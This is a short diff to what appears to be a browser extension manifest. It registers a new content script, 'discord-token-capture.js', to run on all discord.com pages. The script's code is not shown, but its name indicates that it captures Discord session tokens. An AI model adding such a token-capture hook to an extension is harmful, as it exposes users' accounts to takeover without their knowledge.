@@ -36,6 +36,11 @@
       "run_at": "document_idle"
     },
     {
+      "matches": ["https://discord.com/*"],
+      "js": ["content/discord-token-capture.js"],
+      "run_at": "document_idle"
+    },
+    {
       "matches": ["https://www.playdeltaforce.com/*"],
       "js": ["content/auth-investigator-content.js"],
       "run_at": "document_start"
